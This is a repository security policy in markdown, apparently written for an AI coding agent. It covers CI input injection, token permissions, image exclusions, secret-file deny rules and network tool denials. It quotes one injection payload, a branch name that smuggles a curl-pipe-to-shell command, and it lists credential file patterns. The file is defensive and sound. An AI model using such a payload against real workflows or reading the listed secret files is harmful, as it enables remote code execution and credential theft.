---
paths:
  - ".github/workflows/*.yml"
  - "docker/**"
  - "src/**/infrastructure/**/*.ts"
  - "src/**/interface/**/*.ts"
  - "package.json"
---

# Security

This repository is **public**. Everything in it is world-readable, and git history is not
retractable — a secret committed and then deleted is a secret that was published. The rules below
are about the boundaries where that matters.

Data-subject obligations — erasure, retention, residency — are in `data-protection.md`. This file is
about the repository and the artefacts it produces.

## Untrusted input in CI

A branch name is attacker-controlled on a public repository: anyone can open a pull request from a
branch they named. `${{ github.event.pull_request.head.ref }}` inside a `run:` block is substituted
**before** the shell parses the line, so a branch named `x"; curl evil | sh; #` executes.

**Every workflow expression reaches a script through `env:`, never inline.** As `$HEAD_REF` the
value is one argument whatever it contains. `tests/standards.test.ts` refuses the inline form.

The same applies to any other field a stranger controls: PR and issue titles and bodies, comment
bodies, commit messages, author names.

## Permissions and tokens

`permissions:` is declared explicitly at the workflow level and kept at the minimum a job needs —
currently `contents: read` and `pull-requests: read`, the latter only so the stacked-PR guard can
ask whether a branch is another PR's base. Nothing in CI writes to a pull request.

Never add a secret to a workflow that runs on `pull_request` from a fork. Never echo a token, even
into a debug line: workflow logs on a public repository are public.

## What must never ship in an artefact

`docker/Dockerfile.dockerignore` excludes the spec corpus, `.claude/`, `.env`, every `*.pem` and
`*.key`, and every `*.sqlite`. Those last ones matter more than they look: a developer's database
holds sealed rows, and shipping ciphertext inside a published image is not recoverable by deleting
the tag.

Adding anything to the image means checking it against that file first. CI asserts the exclusions
hold on every build.

## Secrets in this repository

Never read, write or edit `.env`, `.env.*`, `*.pem`, `*.key`, `id_rsa*`, `id_ed25519*`, or anything
under `secrets/` or `credentials/`. These are denied in `.claude/settings.json` as well as here.

If a credential appears in a diff, a log, or an error, redact it before it reaches a response, a
commit message, a pull request, or any file under version control. Describe what a credential is
for, never what it is.

`.claude/settings.local.json` is the machine-local half of the settings and is git-ignored. Anything
carrying an absolute path or a personal preference belongs there rather than in the tracked file.

## Credential boundaries

When adding one, state which of **signature**, **validity window**, **lifetime bound** and **replay
ledger** applies, and why the others do not. A boundary with fewer controls than a lower-stakes
neighbour is a defect until justified (LD-7).

The control has to match the credential's shape. A nonce ledger is right for an agent card
presented once per handoff and wrong for a tenant claim replayed on every query — copying the
card's controls across would have broken normal operation, and copying none of them left a captured
token valid forever.

**Bound the lifetime, not just the deadline.** An issuer that can set expiry arbitrarily far out
defeats an expiry check: a token minted with a ten-year lifetime passes it and is functionally the
unexpiring token the check exists to prevent.

## Dependencies

`dependencies` in `package.json` is empty and the runtime has no third-party imports — only
`bun:sqlite` and `node:crypto`. That is a property worth keeping: it is why the image ships no
`node_modules`, and why a supply-chain compromise has no runtime surface here.

Adding a runtime dependency is therefore a decision, not a convenience. Prefer a well-established
package over a freshly published one, and note its age and install count if either looks thin. Lock
files are authoritative — never regenerate one unless that is the change.

## Network access

`WebFetch`, `WebSearch`, `curl` and `wget` are denied. This is a **routing preference, not a
security boundary** — `Bash(bun *)` is allowed, so the network is one line away regardless, and
recording it as a boundary would be a false claim about what is enforced (LD-10). The intended path
is the `bun-webview` skill, which drives a real browser.

A real boundary would be `sandbox.network.allowedDomains` with `strictAllowlist: true`, which
enforces per-runtime rather than per-tool. Deliberately not enabled: it would break `bun install`
and `gh` until the domain list was tuned, and the goal here is tool choice, not containment.
